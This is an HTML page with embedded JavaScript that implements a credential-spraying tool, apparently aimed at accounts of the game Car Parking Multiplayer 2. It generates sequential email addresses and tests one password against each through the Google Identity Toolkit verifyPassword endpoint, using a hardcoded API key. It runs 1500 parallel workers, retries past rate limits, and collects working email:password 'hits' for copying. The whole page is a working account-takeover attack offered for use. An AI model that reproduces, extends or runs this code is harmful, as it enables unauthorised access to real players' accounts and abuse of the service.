<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CPM2 ACCURACY V16</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 10px; text-align: center; }
        .terminal { max-width: 550px; margin: auto; border: 2px solid #0f0; background: #050505; padding: 20px; box-shadow: 0 0 30px #0f0; border-radius: 12px; }
        h1 { font-size: 18px; color: #fff; margin-bottom: 20px; border-bottom: 2px solid #0f0; padding-bottom: 10px; text-transform: uppercase; }
        
        /* Input Sections */
        .input-group { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
        .range-row { display: flex; gap: 10px; }
        input { flex: 1; padding: 15px; background: #111; border: 1px solid #0f0; color: #fff; border-radius: 5px; outline: none; font-size: 15px; text-align: center; }
        input:focus { box-shadow: 0 0 10px #0f0; }

        .btn-start { width: 100%; padding: 20px; background: #0f0; color: #000; border: none; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 8px; transition: 0.3s; }
        .btn-copy { width: 100%; padding: 12px; background: #222; color: #0f0; border: 1px solid #0f0; margin-top: 10px; cursor: pointer; border-radius: 5px; font-weight: bold; }
        
        /* Stats Dashboard */
        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
        .stat-card { background: #0a0a0a; border: 1px solid #333; padding: 15px; border-radius: 8px; }
        .stat-card span { font-size: 11px; color: #888; display: block; margin-bottom: 5px; }
        .stat-card b { font-size: 26px; color: #0f0; }

        #speed-info { color: #0ff; font-weight: bold; margin-bottom: 15px; font-size: 14px; }
        #results { width: 100%; height: 350px; background: #000; color: #fff; border: 1px solid #333; padding: 10px; font-size: 13px; margin-top: 15px; resize: none; border-radius: 8px; font-family: monospace; }
    </style>
</head>
<body>

<div class="terminal">
    <h1>🚀 CPM2 ULTIMATE ENGINE</h1>
    <div id="speed-info">SYSTEM STATUS: READY</div>

    <div class="input-group">
        <div class="range-row">
            <input type="number" id="startRange" placeholder="START NUM (1)">
            <input type="number" id="endRange" placeholder="END NUM (1000)">
        </div>
        <input type="text" id="format" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
        <input type="text" id="password" placeholder="PASSWORD">
    </div>
    
    <button class="btn-start" id="actionBtn" onclick="ignite()">⚡ START SEQUENTIAL ATTACK</button>
    <button class="btn-copy" onclick="copyHits()">📋 COPY ALL HITS</button>

    <div class="stats">
        <div class="stat-card"><span>CHECKED (ORDER)</span><b id="checkedCount">0</b></div>
        <div class="stat-card"><span>HITS FOUND</span><b id="foundCount">0</b></div>
    </div>

    <textarea id="results" readonly placeholder="Hits will stream here in 1, 2, 3... order. No skips."></textarea>
</div>

<script>
    let isRunning = false, checked = 0, found = 0, currentNum, endLimit, nextToSync = 0;
    let storage = new Map(), uiBuffer = "", startTime;
    
    // Original CPM2 Key
    const apiKey = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

    async function ignite() {
        if (isRunning) { location.reload(); return; }

        let s = parseInt(document.getElementById('startRange').value);
        let e = parseInt(document.getElementById('endRange').value);
        let fmt = document.getElementById('format').value.toUpperCase().trim();
        let pwd = document.getElementById('password').value.trim();

        if (isNaN(s) || isNaN(e) || !fmt.includes('{')) return alert("Inputs ശരിയല്ല ബ്രോ!");

        isRunning = true;
        currentNum = s;
        nextToSync = s;
        endLimit = e;
        startTime = Date.now();

        document.getElementById('actionBtn').innerText = "🛑 STOP ENGINE";
        document.getElementById('actionBtn').style.background = "#f00";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];

        // 1500 Multi-threaded workers
        for (let i = 0; i < 1500; i++) {
            (async function worker() {
                while (isRunning && currentNum <= endLimit) {
                    let taskNum = currentNum++;
                    await processCheck(fmt, pwd, taskNum, digits);
                }
            })();
        }

        // Fast UI Refresh
        setInterval(() => {
            if (!isRunning) return;
            let elapsed = (Date.now() - startTime) / 1000;
            let speed = Math.round(checked / (elapsed || 1));
            document.getElementById('speed-info').innerText = `🔥 SPEED: ${speed} REQ/S | SYNCING AT: ${nextToSync}`;
            document.getElementById('checkedCount').innerText = checked;
            document.getElementById('foundCount').innerText = found;

            if (uiBuffer !== "") {
                let box = document.getElementById('results');
                box.value += uiBuffer;
                box.scrollTop = box.scrollHeight;
                uiBuffer = "";
            }
        }, 400);
    }

    async function processCheck(fmt, pwd, num, digits) {
        let email = fmt.replace(/\{(\d+)\}/, num.toString().padStart(digits, '0'));
        
        try {
            let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${apiKey}`, {
                method: 'POST',
                body: JSON.stringify({ email: email, password: pwd, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            
            if (res.status === 429) {
                await new Promise(r => setTimeout(r, 2000));
                return processCheck(fmt, pwd, num, digits);
            }

            let data = await res.json();
            storage.set(num, { isHit: (data && data.idToken), account: email });

            // STRICT SEQUENTIAL SYNC: 1, 2, 3...
            while (storage.has(nextToSync)) {
                let result = storage.get(nextToSync);
                if (result.isHit) {
                    found++;
                    uiBuffer += result.account + ":" + pwd + "\n";
                }
                checked++;
                storage.delete(nextToSync);
                nextToSync++;
            }
        } catch (err) {
            return processCheck(fmt, pwd, num, digits);
        }
    }

    function copyHits() {
        let box = document.getElementById('results');
        box.select();
        document.execCommand('copy');
        alert("Found Hits Copied! 🔥");
    }
</script>
</body>
</html>
